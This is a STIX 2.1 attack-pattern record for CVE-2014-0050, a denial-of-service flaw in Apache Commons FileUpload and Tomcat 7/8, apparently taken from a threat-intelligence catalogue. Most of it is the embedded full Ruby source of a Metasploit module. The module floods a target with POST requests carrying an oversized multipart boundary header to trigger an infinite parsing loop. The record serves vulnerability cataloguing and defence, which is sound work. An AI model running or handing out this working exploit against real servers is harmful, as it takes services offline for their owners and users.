{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4e343b4d-c957-437b-bc4b-36f7f4576fcc",
    "created": "2024-08-14T16:26:21.935883Z",
    "modified": "2024-08-14T16:26:21.935887Z",
    "name": "Apache Commons FileUpload and Apache Tomcat DoS",
    "description": " This module triggers an infinite loop in Apache Commons FileUpload 1.0 through 1.3 via a specially crafted Content-Type header. Apache Tomcat 7 and Apache Tomcat 8 use a copy of FileUpload to handle mime-multipart requests, therefore, Apache Tomcat 7.0.0 through 7.0.50 and 8.0.0-RC1 through 8.0.1 are affected by this issue. Tomcat 6 also uses Commons FileUpload as part of the Manager application. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/http/apache_commons_fileupload_dos.rb",
            "external_id": "apache_commons_fileupload_dos.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-0050"
        },
        {
            "source_name": "reference",
            "url": "https://tomcat.apache.org/security-8.html"
        },
        {
            "source_name": "reference",
            "url": "https://tomcat.apache.org/security-7.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'Apache Commons FileUpload and Apache Tomcat DoS',\n      'Description'     => %q{\n        This module triggers an infinite loop in Apache Commons FileUpload 1.0\n        through 1.3 via a specially crafted Content-Type header.\n        Apache Tomcat 7 and Apache Tomcat 8 use a copy of FileUpload to handle\n        mime-multipart requests, therefore, Apache Tomcat 7.0.0 through 7.0.50\n        and 8.0.0-RC1 through 8.0.1 are affected by this issue. Tomcat 6 also\n        uses Commons FileUpload as part of the Manager application.\n       },\n       'Author'         =>\n         [\n           'Unknown', # This issue was reported to the Apache Software Foundation and accidentally made public.\n           'ribeirux' # metasploit module\n         ],\n       'License'        => MSF_LICENSE,\n       'References'     =>\n         [\n           ['CVE', '2014-0050'],\n           ['URL', 'https://tomcat.apache.org/security-8.html'],\n           ['URL', 'https://tomcat.apache.org/security-7.html']\n         ],\n        'DisclosureDate' => '2014-02-06'\n      ))\n\n      register_options(\n        [\n          Opt::RPORT(8080),\n          OptString.new('TARGETURI', [ true,  \"The request URI\", '/']),\n          OptInt.new('RLIMIT', [ true,  \"Number of requests to send\",50])\n        ])\n  end\n\n  def run\n    boundary = \"0\"*4092\n    opts = {\n      'method'         => \"POST\",\n      'uri'            => normalize_uri(target_uri.to_s),\n      'ctype'          => \"multipart/form-data; boundary=#{boundary}\",\n      'data'           => \"#{boundary}00000\",\n      'headers' => {\n        'Accept' => '*/*'\n      }\n    }\n\n    # XXX: There is rarely, if ever, a need for a 'for' loop in Ruby\n    # This should be rewritten with 1.upto() or Enumerable#each or\n    # something\n    for x in 1..datastore['RLIMIT']\n      print_status(\"Sending request #{x} to #{peer}\")\n      begin\n        c = connect\n        r = c.request_cgi(opts)\n        c.send_request(r)\n        # Don't wait for a response\n      rescue ::Rex::ConnectionError => exception\n        print_error(\"Unable to connect: '#{exception.message}'\")\n        return\n      ensure\n        disconnect(c) if c\n      end\n    end\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2014-02-06"
}